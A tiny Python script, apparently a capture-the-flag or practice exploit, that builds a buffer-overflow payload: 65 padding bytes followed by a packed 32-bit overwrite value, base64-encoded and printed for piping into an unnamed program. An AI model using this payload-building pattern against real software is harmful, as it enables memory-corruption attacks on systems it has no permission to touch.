
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
buf += struct.pack('<I', 364194039)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
